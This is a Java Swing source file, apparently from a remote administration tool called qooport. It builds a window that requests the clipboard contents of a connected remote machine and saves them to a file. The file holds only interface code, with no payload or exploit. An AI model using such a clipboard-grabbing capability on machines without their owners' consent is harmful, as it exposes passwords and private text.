package qooport.modulos;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JEditorPane;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JToolBar;
import qooport.asociado.Asociado;
import qooport.utilidades.Util;

public class Portapapeles extends JFrame {

    private Asociado servidor;

    public JTextArea contenido;
    public JEditorPane contenido2;

    public Portapapeles(Asociado servidor) {
        initComponents();
        this.servidor = servidor;
    }

    private void initComponents() {

        /////////////////////////////////////////////
//                TABLE DE INFORMACION
        /////////////////////////////////////////////
        JPanel panel1 = new JPanel();
        JToolBar b1 = new JToolBar();
        b1.setFloatable(false);
        JButton boton1 = new JButton();
        JScrollPane scrollPane1;
        scrollPane1 = new JScrollPane();
        boton1.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        boton1.setText("Solicitar");
        boton1.setVisible(true);
        boton1.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Portapapeles.this.btnPedir(evt);
            }
        });
        b1.add(boton1);

        JButton btnGuardar = new JButton();
        btnGuardar.setIcon(Util.cargarIcono16("/resources/save.png"));
        btnGuardar.setVisible(true);
        btnGuardar.setText("Guardar");
        btnGuardar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Util.guardarTexto(contenido.getText());
            }
        });
        b1.add(btnGuardar);

        contenido = new JTextArea();

        scrollPane1.setViewportView(this.contenido);
        panel1.setLayout(new BorderLayout());
        panel1.add(scrollPane1, BorderLayout.CENTER);
        panel1.add(b1, BorderLayout.SOUTH);

        /////////////////////////////////////////////
//                TABLE DE 2
        /////////////////////////////////////////////
//        JPanel panel2 = new JPanel();
//        JToolBar b2 = new JToolBar();
//        b2.setFloatable(false);
//        JButton boton2 = new JButton();
//        JScrollPane scrollPane2;
//        scrollPane2 = new JScrollPane();
//        boton2.setIcon(Util.cargarIcono16("/resources/refresh.png"));
//        boton2.setVisible(true);
//        boton2.addActionListener(new ActionListener() {
//            public void actionPerformed(ActionEvent evt) {
//                Portapapeles.this.btnPedir(evt);
//            }
//        });
//        b2.add(boton2);
//        contenido2 = new JEditorPane();
////        contenido2.setEditorKit(new RTFEditorKit());
//
//        // Marcamos el editor para que use HTML
////        contenido2.setContentType("text/html");
//// o para que use RTF
//        contenido2.setContentType("text/rtf");
//
////        try {
////            contenido2.getDocument().insertString(0, "texto inicial 2", null);
////        } catch (BadLocationException ex) {
////            ex.printStackTrace();
////        }
//        contenido2.setText(
//                "{\\rtf1"
//                + "{\\colortbl ;\\red255\\green0\\blue0;}"
//                + "Esto\\par "
//                + "es una \\b prueba\\b0  de \\i cursiva\\i0\\par "
//                + "y \\cf1 todo\\cf0 \\par" + "}");
//
////        contenido2.setText("texto inicial 2");
//// o para texto normalito
////        contenido2.setContentType("text/plain");
//        scrollPane2.setViewportView(this.contenido2);
//        panel2.setLayout(new BorderLayout());
//        panel2.add(scrollPane2, BorderLayout.CENTER);
//        panel2.add(b2, BorderLayout.SOUTH);
        this.setLayout(new BorderLayout());
//        this.add(barra, BorderLayout.NORTH);
        this.add(panel1, BorderLayout.CENTER);
        this.setIconImage(Util.cargarIcono16("/resources/clipboard.png").getImage());
        this.setSize(600, 450);
        this.setResizable(true);
        this.setVisible(true);
        pack();
    }

    private void btnPedir(ActionEvent evt) {
        servidor.pedirPortapapeles();
    }

}
